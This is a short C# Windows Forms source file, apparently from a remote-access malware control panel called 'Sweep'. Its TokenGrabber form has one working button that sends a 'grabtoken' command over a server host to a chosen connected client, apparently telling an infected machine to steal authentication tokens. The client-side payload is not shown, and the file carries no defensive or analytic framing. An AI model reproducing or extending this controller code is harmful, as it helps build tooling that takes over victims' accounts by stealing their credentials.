using LazyServer;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweep.Forms
{
    public partial class TokenGrabber : Form
    {
        public LazyServerHost serverHost;
        public string connid;
        public TokenGrabber()
        {
            InitializeComponent();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private async void grab_Click(object sender, EventArgs e)
        {
            await serverHost.SendMessageToClient(connid, new JObject {
                ["command"] = "grabtoken"
            }.ToString());
        }
    }
}
